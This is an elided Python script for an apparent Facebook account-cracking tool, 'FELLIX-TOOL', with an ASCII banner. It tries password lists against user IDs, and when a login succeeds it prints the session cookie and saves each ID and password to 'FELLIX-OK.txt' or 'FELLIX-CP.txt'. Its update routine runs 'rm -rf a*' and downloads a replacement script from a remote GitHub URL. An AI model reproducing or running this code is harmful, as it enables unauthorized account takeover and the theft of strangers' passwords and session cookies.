...
logo = """
d88888b d88888b d88888b db      d888888b db    db 
88'     88'     88'     88        `88'   `8b  d8' 
88ooo   88ooooo 88ooooo 88         88     `8bd8'  
88~~~   88~~~~~ 88~~~~~ 88         88     .dPYb.  
88      88.     88.     88booo.   .88.   .8P  Y8. 
YP      Y88888P Y88888P Y88888P Y888888P YP    YP                                                                                                    
--------------------------------------------------
[•] AUTHOR     : \033[1;32mFELLIX\033[1;37m
[•] GITHUB     : \033[1;32mFELIX-XD\033[1;37m
[•] TOOL NAME  : \033[1;32mFELLIX-TOOL\033[1;37m
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/FELLIX/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/FELLIX/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/FELLIX/ali/main/ali.py > ali.py')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FELLIX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('FELLIX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[FELLIX-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('FELLIX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mFELLIX\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
menu()
